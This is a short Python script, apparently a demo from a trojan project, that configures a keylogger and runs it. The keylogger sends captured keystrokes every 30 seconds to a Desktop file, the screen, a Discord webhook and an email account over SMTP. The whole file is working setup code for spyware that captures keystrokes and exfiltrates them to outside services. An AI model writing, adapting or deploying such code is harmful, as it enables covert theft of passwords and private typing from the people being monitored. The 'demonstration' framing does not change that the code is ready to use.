#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).parents[1]))

from src.modules.exfiltration import Discord, Email, File, Screen
from src.modules.exploitation import KeyLogger

import dotenv


dotenv.load_dotenv()

'''This is a simple demonstration of how the keylogger could be set up 
on a Linux system to exfiltrate information to a text file, a Discord 
server and an email address (as well as to the screen for debugging 
purposes).
The environment variable 'WEBHOOK_URL' must be passed if the Discord 
exfiltrator is to be used; similarly we need 'EMAIL_USERNAME' and 
'EMAIL_PASSWORD' for the Email exfiltrator.
'''

# Setting up the Keylogger to exfiltrate data every 30 seconds
keylogger = KeyLogger(exfil_time=30)

# Enabling output of logs to STDOUT
Screen(module=keylogger)

# A file will be written to the current user's Desktop
File(module=keylogger,
     file_path=pathlib.Path.home().joinpath("Desktop/sample_keylogger_log.txt"))

# Captured data will be sent to a Discord server through a Webhook URL
Discord(module=keylogger,
        webhook_url=os.getenv("WEBHOOK_URL"))

# An email will be sent through a secure connection using SMTP
Email(module=keylogger,
      smtp_host=os.getenv("EMAIL_HOST"),
      smtp_port=465,
      email=os.getenv("EMAIL_USERNAME"),
      password=os.getenv("EMAIL_PASSWORD"))

# Done. Begin monitoring of keyboard events and exfiltration of data.
keylogger.execute()
